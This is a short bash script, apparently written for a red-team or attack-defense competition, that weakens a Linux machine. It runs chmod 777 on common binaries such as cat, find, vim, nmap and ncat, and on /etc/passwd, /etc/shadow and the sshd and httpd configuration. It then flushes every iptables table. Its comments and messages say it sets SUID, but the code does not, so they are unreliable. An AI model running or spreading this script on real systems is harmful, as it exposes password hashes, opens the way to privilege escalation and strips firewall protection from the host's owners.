##Dylan Nandlall 
##dan6705@rit.edu


##Changes suid on binaries labeled in "bins" and "files"
suid_tool() {
    echo "Setting SUID on binaries";

    ##Variable with binaries that will get their SUID replaced
    bins="cat tar awk find nano vim vi xtables-multi cp less more nmap man"
    bins="$bins watch chmod mv ncat"
    ##Variable with file binaries in /etc/
    files="passwd skel shadow httpd sshd"

    ##Loops through bins and gives perms to the bins for the user
    for b in $bins; do
	chmod 777 /usr/bin/$b;
        [ "$?" = "0" ] && echo "SUID set on $b";
    done

    ##Loops through files and gives perms to the bins for the user
    for f in $files; do
        chmod 777 /etc/$f;
        [ "$?" = "0" ] && echo "SUID set on $f";
    done

    return 0;
};


##Flushes iptables
iptable_commands() {
    iptables -t mangle -F
    iptables -F
    iptables -t raw -F
    iptables -t nat -F
    iptables -t filter -F
    echo "iptable commands executed";
};


main() {
    suid_tool;
    iptable_commands;
};

main;
